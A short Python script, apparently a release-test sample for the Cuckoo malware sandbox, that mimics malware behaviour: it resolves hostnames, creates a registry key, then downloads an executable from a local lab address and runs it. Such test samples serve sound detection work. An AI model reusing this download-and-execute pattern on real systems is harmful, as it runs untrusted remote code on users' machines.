from ctypes import *
import socket
import _winreg
import urllib
import subprocess

# load some librarires
kernel32 = windll.kernel32 
msvcrt = cdll.msvcrt 

# resolv hostnames
hostnames = ["google.com","twitter.com","reddit.com"]
for h in hostnames:
	try:
		addr = socket.gethostbyname(h)
	except:
		pass

# edit registry 
key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE, "Software\\Cuckoo\\ReleaseTest")

print("Downloading file")
# download exe via http and execute
urllib.urlretrieve ("http://192.168.56.1:8089/tests/test_samples/dl.exe", "test.exe")

print("executing file")
args = ("test.exe")
popen = subprocess.Popen(args, stdout=subprocess.PIPE)
popen.wait()
output = popen.stdout.read()
print output